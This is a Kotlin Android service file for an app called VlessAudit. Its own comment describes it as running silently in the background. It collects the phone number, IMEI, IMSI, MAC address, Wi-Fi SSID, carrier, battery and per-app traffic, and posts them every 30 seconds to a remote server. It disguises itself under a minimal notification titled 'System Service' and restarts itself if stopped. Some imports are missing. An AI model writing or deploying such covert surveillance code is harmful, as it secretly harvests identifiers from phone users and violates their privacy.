package com.vlessaudit

import android.Manifest
import android.annotation.SuppressLint
import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.location.Location
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.TrafficStats
import android.net.wifi.WifiInfo
import android.net.wifi.WifiManager
import android.os.*
import android.provider.Settings
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.gson.Gson
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException
import java.net.InetAddress
import java.util.*
import java.util.concurrent.TimeUnit

/**
 * VlessAudit 客户端监控服务
 * 静默后台运行，收集设备信息 + 位置 + 流量，加密上报到服务端
 */
class MonitorService : Service() {

    private val gson = Gson()
    private val client = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .writeTimeout(10, TimeUnit.SECONDS)
        .build()

    private var deviceId: String = ""
    private var serverUrl: String = ""
    private var authToken: String = ""
    private var reportInterval: Long = 30_000L // 默认30秒上报一次

    private val handler = Handler(Looper.getMainLooper())
    private lateinit var reportRunnable: Runnable

    override fun onCreate() {
        super.onCreate()
        startForegroundService()
        deviceId = getDeviceId()
        loadConfig()
        registerDevice()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        serverUrl = intent?.getStringExtra("server_url") ?: serverUrl
        authToken = intent?.getStringExtra("auth_token") ?: authToken
        startPeriodicReport()
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        handler.removeCallbacks(reportRunnable)
        super.onDestroy()
    }

    // ── 前台服务（防杀） ──
    private fun startForegroundService() {
        val channelId = "vless_audit_monitor"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId, "系统服务", NotificationManager.IMPORTANCE_MIN
            )
            val nm = getSystemService(NotificationManager::class.java)
            nm.createNotificationChannel(channel)
        }
        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("系统服务")
            .setContentText("正在运行中...")
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
        startForeground(1, notification)
    }

    // ── 配置 ──
    private fun loadConfig() {
        val prefs = getSharedPreferences("vless_audit", MODE_PRIVATE)
        serverUrl = prefs.getString("server_url", "") ?: ""
        authToken = prefs.getString("auth_token", "") ?: ""
        reportInterval = prefs.getLong("report_interval", 30_000L)
    }

    // ── 设备 ID ──
    @SuppressLint("HardwareIds")
    private fun getDeviceId(): String {
        val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        return androidId?.take(32) ?: UUID.randomUUID().toString().take(32)
    }

    // ── 注册设备 ──
    private fun registerDevice() {
        val data = collectDeviceInfo()
        postJson("$serverUrl/api/client/register", data)
    }

    // ── 采集设备信息 ──
    @SuppressLint("MissingPermission", "HardwareIds")
    private fun collectDeviceInfo(): Map<String, Any> {
        val tm = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
        val wm = applicationContext.getSystemService(WIFI_SERVICE) as WifiManager
        val cm = getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager

        // 手机号（三种方式）
        val phoneNumber = getPhoneNumber(tm)

        // IMEI
        var imei = ""
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
            imei = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                tm.imei ?: ""
            } else {
                @Suppress("DEPRECATION")
                tm.deviceId ?: ""
            }
        }

        // IMSI
        var imsi = ""
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
            imsi = tm.subscriberId ?: ""
        }

        // WiFi SSID
        var wifiSSID = ""
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            val wifiInfo: WifiInfo? = wm.connectionInfo
            wifiSSID = wifiInfo?.ssid?.replace("\"", "") ?: ""
        }

        // 运营商
        val carrier = tm.networkOperatorName ?: ""

        // 网络类型
        val networkType = when {
            cm.getNetworkCapabilities(cm.activeNetwork)?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true -> "WiFi"
            cm.getNetworkCapabilities(cm.activeNetwork)?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true -> {
                when (tm.dataNetworkType) {
                    TelephonyManager.NETWORK_TYPE_LTE -> "4G"
                    TelephonyManager.NETWORK_TYPE_NR -> "5G"
                    else -> "Mobile"
                }
            }
            else -> "Unknown"
        }

        return mapOf(
            "device_id" to deviceId,
            "user_email" to (getSharedPreferences("vless_audit", MODE_PRIVATE).getString("user_email", "") ?: ""),
            "brand" to Build.BRAND,
            "model" to Build.MODEL,
            "os_version" to "Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})",
            "phone_number" to phoneNumber,
            "imei" to imei,
            "imsi" to imsi,
            "mac_addr" to getMacAddress(),
            "screen_size" to "${getScreenWidth()}x${getScreenHeight()}",
            "carrier" to carrier,
            "network_type" to networkType,
            "wifi_ssid" to wifiSSID,
        )
    }

    // ── 获取手机号 ──
    @SuppressLint("MissingPermission")
    private fun getPhoneNumber(tm: TelephonyManager): String {
        // 方式1: 直接从 SIM 读取
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(this, "android.permission.READ_PHONE_NUMBERS") == PackageManager.PERMISSION_GRANTED) {
            val number = tm.line1Number
            if (!number.isNullOrBlank() && number.length >= 11) return number
        }
        // 方式2: 通过 SubscriptionManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            val subManager = getSystemService(TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
            val subs = subManager.activeSubscriptionInfoList
            if (!subs.isNullOrEmpty()) {
                for (sub in subs) {
                    val num = sub.number
                    if (!num.isNullOrBlank() && num.length >= 11) return num
                }
            }
        }
        return ""
    }

    // ── MAC 地址 ──
    private fun getMacAddress(): String {
        return try {
            val interfaces = NetworkInterface.getNetworkInterfaces()
            val list = Collections.list(interfaces)
            for (intf in list) {
                if (intf.name.equals("wlan0", ignoreCase = true)) {
                    val mac = intf.hardwareAddress
                    if (mac != null) {
                        return mac.joinToString(":") { "%02X".format(it) }
                    }
                }
            }
            ""
        } catch (e: Exception) { "" }
    }

    private fun getScreenWidth(): Int = resources.displayMetrics.widthPixels
    private fun getScreenHeight(): Int = resources.displayMetrics.heightPixels

    // ── 定时上报 ──
    private fun startPeriodicReport() {
        reportRunnable = object : Runnable {
            override fun run() {
                reportTelemetry()
                handler.postDelayed(this, reportInterval)
            }
        }
        handler.post(reportRunnable)
    }

    // ── 上报遥测数据 ──
    private fun reportTelemetry() {
        val data = collectTelemetry()
        postJson("$serverUrl/api/client/report", data)
    }

    private fun collectTelemetry(): Map<String, Any> {
        val batteryIntent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val batteryLevel = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val batteryScale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, 100) ?: 100
        val batteryPct = if (batteryLevel >= 0 && batteryScale > 0) (batteryLevel * 100 / batteryScale) else -1
        val isCharging = batteryIntent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) in listOf(
            BatteryManager.BATTERY_STATUS_CHARGING, BatteryManager.BATTERY_STATUS_FULL
        )

        // 应用流量统计
        val appTraffic = collectAppTraffic()

        return mapOf(
            "device_id" to deviceId,
            "user_email" to (getSharedPreferences("vless_audit", MODE_PRIVATE).getString("user_email", "") ?: ""),
            "latitude" to 0.0,  // 由 LocationCollector 填充
            "longitude" to 0.0,
            "battery" to batteryPct,
            "is_charging" to isCharging,
            "screen_on" to isScreenOn(),
            "app_traffic" to gson.toJson(appTraffic),
            "dns_queries" to "",
            "latency_ms" to measureLatency(),
            "reported_at" to System.currentTimeMillis(),
        )
    }

    // ── 采集应用流量 ──
    private fun collectAppTraffic(): Map<String, Map<String, Long>> {
        val result = mutableMapOf<String, Map<String, Long>>()
        val pm = packageManager
        val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
        for (app in apps) {
            try {
                val uid = app.uid
                val rx = TrafficStats.getUidRxBytes(uid)
                val tx = TrafficStats.getUidTxBytes(uid)
                if (rx > 0 || tx > 0) {
                    result[app.packageName] = mapOf("rx" to rx, "tx" to tx)
                }
            } catch (_: Exception) {}
        }
        return result
    }

    private fun isScreenOn(): Boolean {
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        return pm.isInteractive
    }

    private fun measureLatency(): Int {
        return try {
            val start = System.currentTimeMillis()
            val reachable = InetAddress.getByName("1.1.1.1").isReachable(2000)
            if (reachable) (System.currentTimeMillis() - start).toInt() else -1
        } catch (_: Exception) { -1 }
    }

    // ── HTTP POST ──
    private fun postJson(url: String, data: Map<String, Any>) {
        if (serverUrl.isBlank()) return
        val json = gson.toJson(data)
        val body = json.toRequestBody("application/json".toMediaType())
        val request = Request.Builder()
            .url(url)
            .header("X-Auth-Token", authToken)
            .post(body)
            .build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.w("VlessAudit", "上报失败: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                Log.d("VlessAudit", "上报成功: ${response.code}")
            }
        })
    }
}
